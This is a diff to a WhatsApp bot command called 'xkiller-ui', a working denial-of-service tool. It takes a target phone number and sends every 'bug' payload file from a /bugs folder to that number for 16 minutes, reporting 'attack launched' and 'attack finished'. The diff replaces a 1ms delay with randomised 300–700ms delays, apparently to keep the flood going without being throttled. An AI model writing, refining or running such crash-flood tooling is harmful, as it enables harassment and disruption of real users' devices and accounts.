@@ -4,35 +4,21 @@ const fs = require('fs');
 const path = require('path');
 
 cmd({
-  pattern: 'xkiller-ui <number>',
+  pattern: 'xkiller-ui ?(.*)',
   desc: 'Bug flood using all payloads from /bugs for 16 minutes',
   category: 'bug',
   react: '💥',
   filename: __filename
-}, async (bot, mek, m, { from, reply }) => {
+}, async (bot, mek, { arg, from, reply }) => {
   try {
-    const prefix = config.PREFIX;
-
-    const body = m.body || '';
-    const cmdName = body.startsWith(prefix)
-      ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
-      : '';
-    if (cmdName !== 'xkiller-ui') return;
-
-    const args = body.trim().split(/\s+/).slice(1);
-    const targetNumber = args[0];
-
-    if (!targetNumber || isNaN(targetNumber)) {
-      return await bot.sendMessage(from, {
-        text: `❌ Usage:\n${prefix}xkiller-ui <number>`
-      }, { quoted: mek });
+    const targetNumber = arg?.replace(/\D/g, '');
+    if (!targetNumber || targetNumber.length < 8) {
+      return await reply(`❌ Usage:\n.xkiller-ui <number>\nEx: .xkiller-ui 50942241547`);
     }
 
     const protectedNumbers = ['13058962443'];
     if (protectedNumbers.includes(targetNumber)) {
-      return await bot.sendMessage(from, {
-        text: '🛡️ This number is protected. Command aborted.'
-      }, { quoted: mek });
+      return await reply('🛡️ This number is protected. Command aborted.');
     }
 
     const targetJid = `${targetNumber}@s.whatsapp.net`;
@@ -40,18 +26,20 @@ cmd({
     const bugFiles = fs.readdirSync(bugsDir).filter(f => f.endsWith('.js'));
 
     if (bugFiles.length === 0) {
-      return await bot.sendMessage(from, { text: '📁 No payloads found in /bugs folder.' }, { quoted: mek });
+      return await reply('📁 No payloads found in /bugs folder.');
     }
 
-    // ✅ VOYE IMG 5.png AVAN ATAK
+    // ✅ Voye imaj avan atak la
     const imagePath = path.join(__dirname, '../media/5.png');
-    const imageBuffer = fs.readFileSync(imagePath);
-    await bot.sendMessage(from, {
-      image: imageBuffer,
-      caption: `🚨 xkiller-ui launched on wa.me/${targetNumber}\n🕒 Duration: 16min\n⚡ Delay: 0.001s\n📦 Payloads: ${bugFiles.length}`,
-    }, { quoted: mek });
+    if (fs.existsSync(imagePath)) {
+      const imageBuffer = fs.readFileSync(imagePath);
+      await bot.sendMessage(from, {
+        image: imageBuffer,
+        caption: `🚨 *xkiller-ui launched on* wa.me/${targetNumber}\n🕒 *Duration:* 16min\n⚡ *Delay:* 300–700ms\n📦 *Payloads:* ${bugFiles.length}`,
+      }, { quoted: mek });
+    }
 
-    const endTime = Date.now() + (16 * 60 * 1000); // 16 minit
+    const endTime = Date.now() + 16 * 60 * 1000; // 16 minit
 
     while (Date.now() < endTime) {
       for (const file of bugFiles) {
@@ -81,16 +69,20 @@ cmd({
           console.error(`❌ Error in ${file}:`, e.message);
         }
 
-        await new Promise(res => setTimeout(res, 1)); // 1ms = 0.001s
+        // ✅ Delay random ant chak payload
+        await new Promise(res => setTimeout(res, 300 + Math.floor(Math.random() * 400))); // 300–700ms
       }
+
+      // ⏱ Delay ant chak sik payload
+      await new Promise(res => setTimeout(res, 1000));
     }
 
     await bot.sendMessage(from, {
-      text: `✅ xkiller-ui attack finished on +${targetNumber}`
+      text: `✅ *xkiller-ui attack finished on* +${targetNumber}`
     }, { quoted: mek });
 
   } catch (err) {
     console.error(err);
-    reply(`❌ Error: ${err.message}`);
+    await reply(`❌ Error: ${err.message}`);
   }
 });
